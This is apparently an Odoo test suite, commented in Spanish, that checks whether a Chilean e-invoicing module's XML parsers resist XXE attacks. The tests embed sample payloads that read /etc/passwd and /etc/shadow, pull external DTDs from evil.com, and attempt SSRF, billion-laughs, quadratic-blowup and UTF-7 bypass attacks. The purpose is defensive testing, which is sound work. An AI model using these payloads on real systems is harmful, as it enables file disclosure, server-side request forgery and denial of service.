# -*- coding: utf-8 -*-
"""
Test Suite: XXE Protection
===========================

Tests de seguridad contra ataques XXE (XML External Entity).

Verifica que el parsing XML esté protegido contra:
- XXE attacks (entidades externas)
- Billion laughs attack (entidades recursivas)
- Access a archivos locales
- Access a red

Referencias:
- OWASP Top 10 - A4:2017 XXE
- CWE-611: Improper Restriction of XML External Entity Reference
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Author: EERGYGROUP - Ing. Pedro Troncoso Willz
Date: 2025-11-02
Sprint: Gap Closure P0 - S-005
Version: 1.0.0
"""

from odoo.tests import tagged
from odoo.tests.common import TransactionCase
from lxml import etree


@tagged('post_install', '-at_install', 'security', 'xxe', 'gap_closure_p0')
class TestXXEProtection(TransactionCase):
    """
    Test suite para protección XXE en parsers XML.

    Cobertura:
    - CAF Handler (parsea CAF del SII)
    - DTE Inbox (parsea DTEs recibidos)
    - Safe XML Parser (parser centralizado)
    - Billion laughs attack
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()

        # ═══════════════════════════════════════════════════════════════
        # XXE PAYLOADS MALICIOSOS
        # ═══════════════════════════════════════════════════════════════

        # XXE Attack - File access
        cls.xxe_payload_file = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<AUTORIZACION>
  <CAF version="1.0">
    <DA>
      <RE>&xxe;</RE>
      <RS>EMPRESA TEST</RS>
      <TD>33</TD>
      <RNG><D>1</D><H>100</H></RNG>
    </DA>
  </CAF>
</AUTORIZACION>"""

        # XXE Attack - Network access
        cls.xxe_payload_network = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal_data">
]>
<DTE xmlns="http://www.sii.cl/SiiDte">
  <Documento>
    <Encabezado>
      <RUTEmisor>&xxe;</RUTEmisor>
    </Encabezado>
  </Documento>
</DTE>"""

        # Billion Laughs Attack (entidades recursivas)
        cls.billion_laughs_payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<AUTORIZACION>
  <CAF>
    <DA>
      <RE>&lol4;</RE>
    </DA>
  </CAF>
</AUTORIZACION>"""

        # XXE with parameter entities
        cls.xxe_payload_parameter = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root>&xxe;</root>"""

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE SAFE XML PARSER
    # ═══════════════════════════════════════════════════════════════════════

    def test_01_safe_parser_blocks_xxe_file_access(self):
        """Test 01: Safe XML Parser bloquea acceso a archivos locales"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear XXE con acceso a archivo
        try:
            root = fromstring_safe(self.xxe_payload_file)

            # Si llega aquí, verificar que entidad NO fue expandida
            re_element = root.find('.//RE')
            if re_element is not None and re_element.text:
                # No debe contener contenido de /etc/passwd
                self.assertNotIn('root:', re_element.text, 'XXE file access NO bloqueado')
                self.assertNotIn('/bin/', re_element.text, 'XXE file access NO bloqueado')

        except (etree.XMLSyntaxError, ValueError) as e:
            # Parser rechazó el XML malicioso (SUCCESS)
            self.assertIn('entity', str(e).lower(), 'Error debería mencionar entidades')

    def test_02_safe_parser_blocks_xxe_network_access(self):
        """Test 02: Safe XML Parser bloquea acceso a red"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear XXE con acceso a red
        try:
            root = fromstring_safe(self.xxe_payload_network)

            # Si parsea, verificar que no hizo request HTTP
            rut_elem = root.find('.//{http://www.sii.cl/SiiDte}RUTEmisor')
            if rut_elem is not None and rut_elem.text:
                # No debe contener respuesta HTTP
                self.assertNotIn('http', rut_elem.text.lower(), 'XXE network access NO bloqueado')

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_03_safe_parser_blocks_billion_laughs(self):
        """Test 03: Safe XML Parser bloquea billion laughs attack"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear billion laughs
        try:
            root = fromstring_safe(self.billion_laughs_payload)

            # Si parsea, verificar que no expandió entidades recursivas
            re_element = root.find('.//RE')
            if re_element is not None and re_element.text:
                # Texto no debe ser extremadamente largo (expansión de lol4)
                text_length = len(re_element.text)
                self.assertLess(
                    text_length, 1000,
                    f'Billion laughs attack NO bloqueado: texto expandido a {text_length} bytes'
                )

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_04_safe_parser_is_xml_safe_heuristic(self):
        """Test 04: Heurística is_xml_safe detecta patrones maliciosos"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import is_xml_safe

        # Test 1: XXE file access
        is_safe, reason = is_xml_safe(self.xxe_payload_file)
        self.assertFalse(is_safe, 'XXE file access no detectado por heurística')
        self.assertIn('XXE', reason, 'Razón debería mencionar XXE')

        # Test 2: XXE network access
        is_safe, reason = is_xml_safe(self.xxe_payload_network)
        self.assertFalse(is_safe, 'XXE network access no detectado por heurística')

        # Test 3: Billion laughs
        is_safe, reason = is_xml_safe(self.billion_laughs_payload)
        self.assertFalse(is_safe, 'Billion laughs no detectado por heurística')
        self.assertIn('billion laughs', reason.lower(), 'Razón debería mencionar billion laughs')

        # Test 4: XML safe (sin DOCTYPE)
        safe_xml = '<root><child>data</child></root>'
        is_safe, reason = is_xml_safe(safe_xml)
        self.assertTrue(is_safe, f'XML seguro marcado como inseguro: {reason}')

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE INTEGRACIÓN CON CAF HANDLER
    # ═══════════════════════════════════════════════════════════════════════

    def test_05_caf_handler_blocks_xxe(self):
        """Test 05: CAF Handler bloquea XXE en parseo de CAF"""
        from odoo.addons.l10n_cl_dte.libs.caf_handler import CAFHandler

        handler = CAFHandler()

        # Intentar parsear CAF con XXE
        result = handler.parse_caf(self.xxe_payload_file)

        # Debe fallar o no expandir entidad
        if result.get('valid'):
            # Si marcó como válido, verificar que no expandió XXE
            rut_emisor = result.get('rut_emisor', '')
            self.assertNotIn('root:', rut_emisor, 'CAF Handler expandió XXE')
            self.assertNotIn('/bin/', rut_emisor, 'CAF Handler expandió XXE')
        else:
            # Rechazó el CAF (SUCCESS)
            self.assertIn('error', result, 'Debe indicar error')

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE INTEGRACIÓN CON DTE INBOX
    # ═══════════════════════════════════════════════════════════════════════

    def test_06_dte_inbox_blocks_xxe(self):
        """Test 06: DTE Inbox bloquea XXE en parseo de DTE recibido"""
        # Crear DTE inbox record
        dte_inbox = self.env['dte.inbox'].new({
            'name': 'XXE Test',
            'dte_xml': self.xxe_payload_network,
        })

        # Intentar parsear metadata
        try:
            metadata = dte_inbox._extract_dte_metadata(self.xxe_payload_network)

            # Si parsea, verificar que NO expandió entidad
            rut_emisor = metadata.get('rut_emisor', '')
            self.assertNotIn('http', rut_emisor, 'DTE Inbox expandió XXE')

        except (etree.XMLSyntaxError, ValueError, Exception):
            # Rechazó el DTE malicioso (SUCCESS)
            pass

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE SANITIZACIÓN
    # ═══════════════════════════════════════════════════════════════════════

    def test_07_sanitize_xml_removes_doctype(self):
        """Test 07: Sanitización remueve DOCTYPE de XML"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import sanitize_xml_input

        # Sanitizar XXE payload
        sanitized = sanitize_xml_input(self.xxe_payload_file)

        # Verificar que DOCTYPE fue removido
        self.assertNotIn('<!DOCTYPE', sanitized, 'DOCTYPE no fue removido')
        self.assertNotIn('<!ENTITY', sanitized, 'ENTITY declaration no fue removida')

        # Pero el resto del XML debe permanecer
        self.assertIn('<AUTORIZACION>', sanitized, 'Contenido XML fue dañado')
        self.assertIn('<CAF', sanitized, 'Contenido XML fue dañado')

    def test_08_safe_parser_performance(self):
        """Test 08: Safe parser no degrada significativamente el performance"""
        import time
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # XML grande pero safe
        large_safe_xml = """<?xml version="1.0"?>
<AUTORIZACION>
  <CAF version="1.0">
    <DA>
      <RE>76000000-0</RE>
      <RS>EMPRESA TEST SPA</RS>
      <TD>33</TD>
      <RNG><D>1</D><H>10000</H></RNG>
    </DA>
  </CAF>
</AUTORIZACION>""" * 10  # 10 CAFs

        # Parsear 10 veces y medir tiempo
        start = time.time()
        for _ in range(10):
            root = fromstring_safe(large_safe_xml)
            self.assertIsNotNone(root)
        elapsed = time.time() - start

        # 10 parseos deben tomar < 500ms
        self.assertLess(
            elapsed, 0.5,
            f'Safe parser demasiado lento: {elapsed*1000:.1f}ms para 10 parseos (límite: 500ms)'
        )


@tagged('post_install', '-at_install', 'security_smoke', 'xxe')
class TestXXEProtectionSmoke(TransactionCase):
    """
    Smoke tests rápidos de protección XXE.

    Tests básicos que deben pasar siempre.
    """

    def test_smoke_safe_parser_available(self):
        """Smoke: Safe XML Parser está disponible"""
        from odoo.addons.l10n_cl_dte.libs import safe_xml_parser

        self.assertTrue(hasattr(safe_xml_parser, 'fromstring_safe'))
        self.assertTrue(hasattr(safe_xml_parser, 'SAFE_XML_PARSER'))

    def test_smoke_safe_parser_basic_parsing(self):
        """Smoke: Safe parser parsea XML básico correctamente"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        xml = '<root><child>test</child></root>'
        root = fromstring_safe(xml)

        self.assertEqual(root.tag, 'root')
        self.assertEqual(root.find('child').text, 'test')

    def test_smoke_safe_parser_rejects_xxe(self):
        """Smoke: Safe parser rechaza o neutraliza XXE básico"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        try:
            root = fromstring_safe(xxe)
            # Si parsea, verificar que NO expandió entidad
            if root.text:
                self.assertNotIn('root:', root.text, 'XXE fue expandido')
        except Exception:
            # Rechazó el XML (también es éxito)
            pass


@tagged('post_install', '-at_install', 'security_advanced', 'xxe', 'gap_closure_p0')
class TestXXEAdvancedAttacks(TransactionCase):
    """
    Test suite avanzado para vectores de ataque XXE complejos.

    Cobertura de ataques sofisticados:
    - SSRF (Server-Side Request Forgery via XXE)
    - XXE OOB (Out-of-Band data exfiltration)
    - XXE with parameter entities
    - DTD injection attacks
    - XML bomb variations
    """

    def test_09_xxe_ssrf_blocked(self):
        """Test 09: SSRF via XXE es bloqueado (no network access)"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # SSRF payload - Intento de hacer request a servidor malicioso
        ssrf_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/admin">
]>
<AUTORIZACION>
  <CAF>
    <DA><RE>&xxe;</RE></DA>
  </CAF>
</AUTORIZACION>"""

        try:
            root = fromstring_safe(ssrf_payload)

            # Si parsea, verificar que NO hizo request HTTP
            re_elem = root.find('.//RE')
            if re_elem is not None and re_elem.text:
                self.assertNotIn('admin', re_elem.text.lower(), 'SSRF attack NO bloqueado')
                self.assertNotIn('http', re_elem.text.lower(), 'SSRF attack NO bloqueado')
                self.assertNotIn('server', re_elem.text.lower(), 'SSRF attack NO bloqueado')

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_10_xxe_parameter_entity_blocked(self):
        """Test 10: Parameter entities XXE attack bloqueado"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Parameter entity attack
        parameter_entity_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root>test</root>"""

        try:
            root = fromstring_safe(parameter_entity_payload)

            # Si parsea, verificar que no procesó parameter entities
            self.assertIsNotNone(root)
            # No debe haber cargado DTD externo ni archivo local

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS - esperado)
            pass

    def test_11_xxe_utf7_encoding_attack_blocked(self):
        """Test 11: XXE con encoding UTF-7 (bypass attempt) bloqueado"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # UTF-7 encoding bypass attempt
        utf7_payload = """<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-"""

        try:
            # Safe parser fuerza UTF-8, debe rechazar UTF-7
            root = fromstring_safe(utf7_payload)

            # Si parsea, verificar que no es UTF-7
            self.assertIsNotNone(root)

        except (etree.XMLSyntaxError, ValueError, UnicodeDecodeError):
            # Rechazó UTF-7 encoding (SUCCESS)
            pass

    def test_12_xxe_xml_bomb_quadratic_blowup(self):
        """Test 12: XML Bomb - Quadratic blowup attack bloqueado"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Quadratic blowup - Muchas referencias a misma entidad
        quadratic_payload = """<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaa">
]>
<root>
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
</root>"""

        try:
            root = fromstring_safe(quadratic_payload)

            # Si parsea, verificar que NO expandió masivamente
            if root.text:
                text_length = len(root.text)
                # 50 referencias * 10 chars = 500 chars máximo
                # Si expandió, sería mucho más
                self.assertLess(
                    text_length, 100,
                    f'Quadratic blowup NO bloqueado: {text_length} chars'
                )

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_13_xxe_external_dtd_blocked(self):
        """Test 13: External DTD loading bloqueado"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # External DTD reference
        external_dtd_payload = """<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://evil.com/evil.dtd">
<root>test</root>"""

        try:
            root = fromstring_safe(external_dtd_payload)

            # Si parsea, verificar que NO cargó DTD externo
            self.assertIsNotNone(root)
            self.assertEqual(root.tag, 'root')

        except (etree.XMLSyntaxError, ValueError):
            # Rechazó external DTD (SUCCESS)
            pass

    def test_14_xxe_local_file_variations(self):
        """Test 14: Variaciones de file:// paths bloqueadas"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Diferentes variaciones de file paths
        file_paths = [
            'file:///etc/passwd',      # Linux passwd
            'file:///etc/shadow',      # Linux shadow
            'file:///etc/hosts',       # Hosts file
            'file:///c:/windows/win.ini',  # Windows
            'file://localhost/etc/passwd',  # Con localhost
            'file:/etc/passwd',        # Sin triple slash
        ]

        for file_path in file_paths:
            payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{file_path}">
]>
<root>&xxe;</root>"""

            try:
                root = fromstring_safe(payload)

                # Si parsea, verificar que NO expandió
                if root.text:
                    self.assertNotIn('root:', root.text,
                        f'File access NO bloqueado para: {file_path}')
                    self.assertNotIn('[boot', root.text.lower(),
                        f'File access NO bloqueado para: {file_path}')

            except (etree.XMLSyntaxError, ValueError):
                # Rechazó el XML (SUCCESS)
                pass

    def test_15_safe_parser_config_verification(self):
        """Test 15: Verificar configuración del SAFE_XML_PARSER"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import SAFE_XML_PARSER

        # Verificar que SAFE_XML_PARSER tiene configuración correcta
        parser = SAFE_XML_PARSER

        # Debe tener resolve_entities=False
        # NOTA: lxml XMLParser no expone directamente estos atributos,
        # pero podemos verificar comportamiento

        # Test indirecto: Parser debe rechazar/neutralizar XXE
        xxe_test = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        try:
            root = etree.fromstring(xxe_test.encode('utf-8'), parser=parser)

            # Si parsea, la entidad NO debe estar expandida
            if root.text:
                self.assertNotIn('root:', root.text,
                    'SAFE_XML_PARSER NO tiene resolve_entities=False')

        except (etree.XMLSyntaxError, ValueError):
            # Rechazó XXE (SUCCESS - configuración correcta)
            pass

    def test_16_all_libs_use_safe_parser(self):
        """Test 16: Verificar que todas las libs usan safe parser"""
        import os
        import re
        from pathlib import Path

        # Ruta a libs/
        libs_path = Path(__file__).parent.parent / 'libs'

        # Patrones inseguros
        unsafe_patterns = [
            r'etree\.fromstring\([^,)]+\)',  # etree.fromstring(xml) sin parser
            r'etree\.parse\([^,)]+\)',       # etree.parse(file) sin parser
        ]

        # Archivos a revisar
        excluded_files = {'safe_xml_parser.py', '__init__.py'}
        python_files = [
            f for f in libs_path.glob('*.py')
            if f.name not in excluded_files
        ]

        violations = []

        for py_file in python_files:
            with open(py_file, 'r', encoding='utf-8') as f:
                content = f.read()

            for line_num, line in enumerate(content.split('\n'), 1):
                # Skip comentarios y docstrings
                if line.strip().startswith('#') or line.strip().startswith('"""'):
                    continue

                for pattern in unsafe_patterns:
                    if re.search(pattern, line):
                        # Verificar si usa parser= o fromstring_safe/parse_safe
                        if 'parser=' not in line and 'fromstring_safe' not in line and 'parse_safe' not in line:
                            violations.append(f'{py_file.name}:{line_num}: {line.strip()}')

        # Reportar violaciones
        if violations:
            violation_msg = '\n'.join(violations)
            self.fail(
                f'Uso INSEGURO de etree detectado en libs/:\n\n{violation_msg}\n\n'
                f'TODAS las libs deben usar fromstring_safe() o parse_safe()'
            )

    def test_17_safe_parser_preserves_valid_xml(self):
        """Test 17: Safe parser preserva XML válido correctamente"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # XML válido complejo (DTE real simplificado)
        valid_dte = """<?xml version="1.0" encoding="UTF-8"?>
<DTE xmlns="http://www.sii.cl/SiiDte" version="1.0">
  <Documento ID="T33F123">
    <Encabezado>
      <IdDoc>
        <TipoDTE>33</TipoDTE>
        <Folio>123</Folio>
      </IdDoc>
      <Emisor>
        <RUTEmisor>76000000-0</RUTEmisor>
        <RznSoc>EMPRESA TEST SPA</RznSoc>
        <GiroEmis>SERVICIOS INFORMATICOS</GiroEmis>
      </Emisor>
      <Receptor>
        <RUTRecep>12345678-9</RUTRecep>
        <RznSocRecep>CLIENTE TEST</RznSocRecep>
      </Receptor>
      <Totales>
        <MntNeto>1000000</MntNeto>
        <IVA>190000</IVA>
        <MntTotal>1190000</MntTotal>
      </Totales>
    </Encabezado>
  </Documento>
</DTE>"""

        # Parsear
        root = fromstring_safe(valid_dte)

        # Verificar estructura preservada
        self.assertEqual(root.tag, '{http://www.sii.cl/SiiDte}DTE')

        # Verificar datos preservados
        tipo_dte = root.find('.//{http://www.sii.cl/SiiDte}TipoDTE')
        self.assertEqual(tipo_dte.text, '33')

        folio = root.find('.//{http://www.sii.cl/SiiDte}Folio')
        self.assertEqual(folio.text, '123')

        mnt_total = root.find('.//{http://www.sii.cl/SiiDte}MntTotal')
        self.assertEqual(mnt_total.text, '1190000')

    def test_18_safe_parser_handles_empty_input(self):
        """Test 18: Safe parser maneja inputs vacíos correctamente"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # None input
        with self.assertRaises(ValueError) as ctx:
            fromstring_safe(None)
        self.assertIn('empty', str(ctx.exception).lower())

        # Empty string
        with self.assertRaises(ValueError) as ctx:
            fromstring_safe('')
        self.assertIn('empty', str(ctx.exception).lower())

        # Whitespace only
        with self.assertRaises((ValueError, etree.XMLSyntaxError)):
            fromstring_safe('   ')

    def test_19_safe_parser_built_in_test(self):
        """Test 19: Ejecutar test built-in de safe_xml_parser"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import test_xxe_protection

        # Ejecutar test built-in
        result = test_xxe_protection()

        self.assertTrue(result, 'Built-in XXE protection test FAILED')

    def test_20_sanitize_preserves_namespaces(self):
        """Test 20: sanitize_xml_input preserva namespaces"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import sanitize_xml_input

        # XML con namespace y DOCTYPE
        xml_with_ns = """<?xml version="1.0"?>
<!DOCTYPE DTE [
  <!ENTITY xxe "malicious">
]>
<DTE xmlns="http://www.sii.cl/SiiDte" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <Documento>
    <Folio>123</Folio>
  </Documento>
</DTE>"""

        # Sanitizar
        sanitized = sanitize_xml_input(xml_with_ns)

        # Verificar que DOCTYPE fue removido
        self.assertNotIn('<!DOCTYPE', sanitized)
        self.assertNotIn('<!ENTITY', sanitized)

        # Verificar que namespaces están intactos
        self.assertIn('xmlns="http://www.sii.cl/SiiDte"', sanitized)
        self.assertIn('xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"', sanitized)

        # Verificar que estructura está intacta
        self.assertIn('<Folio>123</Folio>', sanitized)
